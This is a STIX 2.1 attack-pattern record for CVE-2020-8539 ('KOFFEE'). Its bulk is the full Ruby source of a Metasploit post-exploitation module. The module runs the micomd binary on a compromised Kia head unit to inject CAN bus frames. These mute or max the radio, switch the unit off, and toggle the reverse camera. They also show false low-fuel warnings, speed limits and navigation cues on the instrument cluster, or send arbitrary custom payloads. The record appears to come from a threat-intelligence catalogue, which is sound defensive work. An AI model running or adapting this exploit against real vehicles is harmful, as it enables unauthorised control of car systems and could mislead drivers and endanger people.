{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f24876b-644a-486f-9ad7-ef506b9b5705",
    "created": "2024-08-14T16:33:01.851932Z",
    "modified": "2024-08-14T16:33:01.851936Z",
    "name": "KOFFEE - Kia OFFensivE Exploit",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/android/local/koffee.rb",
            "external_id": "koffee.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8539"
        },
        {
            "source_name": "reference",
            "url": "https://sowhat.iit.cnr.it/pdf/IIT-20-2020.pdf"
        }
    ],
    "x_code_snippet": "# frozen_string_literal: true\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'KOFFEE - Kia OFFensivE Exploit',\n        'Description' => %q{\n          This module exploits CVE-2020-8539, which is an arbitrary code execution vulnerability that allows an to\n          attacker execute the micomd binary file on the head unit of Kia Motors. This module has been tested on\n          SOP.003.30.18.0703, SOP.005.7.181019 and SOP.007.1.191209 head unit software versions. This module, run on an\n          active session, allows an attacker to send crafted micomd commands that allow the attacker to control the head\n          unit and send CAN bus frames into the Multimedia CAN (M-Can) of the vehicle.\n        },\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'Gianpiero Costantino',\n          'Ilaria Matteucci'\n        ],\n        'References' => [\n          ['CVE', '2020-8539'],\n          ['URL', 'https://sowhat.iit.cnr.it/pdf/IIT-20-2020.pdf']\n        ],\n        'Actions' => [\n          [ 'TOGGLE_RADIO_MUTE', { 'Description' => 'It mutes/umutes the radio' } ],\n          [ 'REDUCE_RADIO_VOLUME', { 'Description' => 'It decreases the radio volume' } ],\n          [ 'MAX_RADIO_VOLUME', { 'Description' => 'It sets the radio volume to the max' } ],\n          [ 'LOW_SCREEN_BRIGHTNESS', { 'Description' => 'It decreases the head unit screen brightness' } ],\n          [ 'HIGH_SCREEN_BRIGHTNESS', { 'Description' => 'It increases the head unit screen brightness' } ],\n          [ 'LOW_FUEL_WARNING', { 'Description' => 'It pops up a low fuel message on the head unit' } ],\n          [ 'NAVIGATION_FULL_SCREEN', { 'Description' => 'It pops up the navigation app window' } ],\n          [ 'SET_NAVIGATION_ADDRESS', { 'Description' => 'It pops up the navigation address window' } ],\n          [ 'SEEK_DOWN_SEARCH', { 'Description' => 'It triggers the seek down radio frequency search' } ],\n          [ 'SEEK_UP_SEARCH', { 'Description' => 'It triggers the seek up radio frequency search' } ],\n          [ 'SWITCH_ON_HU', { 'Description' => 'It switches on the head unit' } ],\n          [ 'SWITCH_OFF_HU', { 'Description' => 'It switches off the head unit' } ],\n          [ 'CAMERA_REVERSE_ON', { 'Description' => 'It shows the parking camera video stream' } ],\n          [ 'CAMERA_REVERSE_OFF', { 'Description' => 'It hides the parking camera video stream' } ],\n          [ 'CLUSTER_CHANGE_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],\n          [ 'CLUSTER_SPEED_LIMIT', { 'Description' => 'It changes the speed limit shown in the instrument cluster' } ],\n          [ 'CLUSTER_ROUNDABOUT_FARAWAY', { 'Description' => 'It shows a round about signal with variable distance in the instrument cluster ' } ],\n          [ 'CLUSTER_RANDOM_NAVIGATION', { 'Description' => 'It shows navigation signals in the instrument cluster ' } ],\n          [ 'CLUSTER_RADIO_INFO', { 'Description' => 'It shows radio info in the instrument cluster ' } ],\n          [ 'INJECT_CUSTOM', { 'Description' => 'It injects custom micom payloads' } ]\n        ],\n        'DefaultAction' => 'TOGGLE_RADIO_MUTE',\n        'Platform' => 'Android',\n        'DisclosureDate' => '2020-12-02',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [SCREEN_EFFECTS, CONFIG_CHANGES, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('MICOMD', [true, 'Path to micomd executable', '/system/bin/micomd']),\n      OptString.new('PERIOD', [true, 'Time (ms) interval between two MICOM commands, aka Period of CAN frames', '0.200']),\n      OptInt.new('NUM_MSG', [true, 'Number of MICOM commands sent each time', '5']),\n      OptString.new('CMD_PAYLOAD', [ false, 'Micom payload to inject, e.g.,  cmd byte1 byte3 byte2', '00 00 00'], conditions: %w[ACTION == INJECT_CUSTOM]),\n    ])\n  end\n\n  def send_in(m_cmd)\n    cmd = \"#{datastore['MICOMD']} -c inject #{m_cmd}\"\n    cmd_exec(cmd)\n    print_good(' -- Command Sent -- ')\n  end\n\n  def send_out(m_cmd)\n    cmd = \"#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}\"\n    cmd_exec(cmd)\n    print_good(' -- Command Sent -- ')\n  end\n\n  def send_custom(m_cmd)\n    cmd = \"#{datastore['MICOMD']} -c inject #{m_cmd}\"\n    var = 0\n    while var < datastore['NUM_MSG'].to_s.to_i\n      cmd_exec(cmd)\n      var += 1\n      print_status(\"> Sending #{var} out of #{datastore['NUM_MSG']}\")\n      sleep(datastore['PERIOD'].to_s.to_f)\n    end\n    print_good(' -- Custom payload Sent-- ')\n  end\n\n  def send_out_custom(m_cmd)\n    cmd = \"#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}\"\n    var = 0\n    while var < datastore['Num_msg'].to_s.to_i\n      cmd_exec(cmd)\n      var += 1\n      print_status(\"> Sending #{var} out of #{datastore['NUM_MSG']}\")\n      sleep(datastore['PERIOD'].to_s.to_f)\n    end\n    print_good(' -- CAN bus frames sent-- ')\n  end\n\n  def run\n    # all conditional options are required when active, make sure none of them are blank\n    options.each_pair do |name, option|\n      next if option.conditions.empty?\n      next unless Msf::OptCondition.show_option(self, option)\n\n      fail_with(Failure::BadConfig, \"The #{name} option is required by the #{action.name} action.\") if datastore[name].blank?\n    end\n    print_status(' -- Starting action -- ')\n    send(\"action_#{action.name.downcase}\")\n  end\n\n  def action_toggle_radio_mute\n    print_status(' -- Mute/umute radio -- ')\n    send_in('8351 04')\n  end\n\n  def action_reduce_radio_volume\n    print_status(' -- Reduce radio volume -- ')\n    send_out('0112 F4 01')\n  end\n\n  def action_max_radio_volume\n    print_status(' -- Max radio volume -- ')\n    send_out('0112 F0')\n  end\n\n  def action_low_screen_brightness\n    print_status(' -- Low screen brightness -- ')\n    send_in('8353 07 01')\n  end\n\n  def action_high_screen_brightness\n    print_status(' -- High screen brightness -- ')\n    send_in('8353 07 00')\n  end\n\n  def action_low_fuel_warning\n    print_status(' -- Low fuel warning -- ')\n    send_in('8353 0B 01')\n  end\n\n  def action_navigation_full_screen\n    print_status(' -- Navigation windows full screen -- ')\n    send_in('8353 0C 01')\n  end\n\n  def action_set_navigation_address\n    print_status(' -- Navigation address window pops up -- ')\n    send_in('8353 0D 03')\n  end\n\n  def action_seek_down_search\n    print_status(' -- Seek down radio search -- ')\n    send_out('133 01')\n  end\n\n  def action_seek_up_search\n    print_status(' -- Seek up radio search -- ')\n    send_out('133 02')\n  end\n\n  def action_switch_on_hu\n    print_status(' -- Switch on Head unit -- ')\n    send_out('170 01')\n  end\n\n  def action_switch_off_hu\n    print_status(' -- Switch off Head unit -- ')\n    send_out('170 00')\n  end\n\n  def action_camera_reverse_on\n    print_status(' -- Parking camera video stream on -- ')\n    send_in('8353 03 01')\n  end\n\n  def action_camera_reverse_off\n    print_status(' -- Parking camera video stream off -- ')\n    send_in('8353 03 00')\n  end\n\n  def action_cluster_change_language\n    print_status(' -- Korean -- ')\n    send_out_custom('4D3 01')\n    print_status(' -- Arabic -- ')\n    send_out_custom('4D3 08')\n    print_status(' -- Polish -- ')\n    send_out_custom('4D3 0E')\n    print_status(' -- Italian -- ')\n    send_out_custom('4D3 12')\n  end\n\n  def action_cluster_speed_limit\n    print_status(' -- Chaning speed limit on the instrument cluster -- ')\n    send_out_custom('4DB 00 0A')\n    send_out_custom('4DB 00 2A')\n    send_out_custom('4DB 00 3A')\n    send_out_custom('4DB 00 5A')\n    send_out_custom('4DB 00 7A')\n    send_out_custom('4DB 00 9A')\n    send_out_custom('4DB 00 AA')\n    send_out_custom('4DB 00 BA')\n  end\n\n  def action_cluster_roundabout_faraway\n    print_status(' -- km -- ')\n    send_out_custom('4D1 66 00 00 00 14 86 10 00')\n    print_status(' -- mi -- ')\n    send_out_custom('4D1 66 00 00 00 14 86 20 00')\n    print_status(' -- ft -- ')\n    send_out_custom('4D1 66 00 00 00 14 86 30 00')\n    print_status(' -- yd -- ')\n    send_out_custom('4D1 66 00 00 00 14 86 40 00')\n    print_status(' -- No distance -- ')\n    send_out_custom('4D1 66 00 00 00 14 86 50 00')\n  end\n\n  def action_cluster_random_navigation\n    print_status(' -- Calculating the route -- ')\n    send_out_custom('4D1 09')\n    print_status(' -- Recalculating the route -- ')\n    send_out_custom('4D1 0A')\n    print_status(' -- Straight ahead -- ')\n    send_out_custom('4D1 0D')\n    print_status(' -- Exit on the Right -- ')\n    send_out_custom('4D1 13')\n    print_status(' -- Exit on the Left -- ')\n    send_out_custom('4D1 14')\n  end\n\n  def action_cluster_radio_info\n    print_status(' -- USB Music -- ')\n    send_out_custom('4D6 65')\n    print_status(' -- Android Auto -- ')\n    send_out_custom('4D6 6F')\n    print_status(' -- FM 168.17 -- ')\n    send_out_custom('4D6 11 9D 00 00 00 00 5F 83')\n    print_status(' -- FM1 168.17 -- ')\n    send_out_custom('4D6 12 9D 00 00 00 00 5F 83')\n    print_status(' -- FM2 168.17 -- ')\n    send_out_custom('4D6 13 9D 00 00 00 00 5F 83')\n  end\n\n  def action_inject_custom\n    print_status(\" -- Injecting custom payload  (#{datastore['CMD_PAYLOAD']}) -- \")\n    send_custom(datastore['CMD_PAYLOAD'])\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-12-02",
    "x_mitre_platforms": [
        "Android'"
    ]
}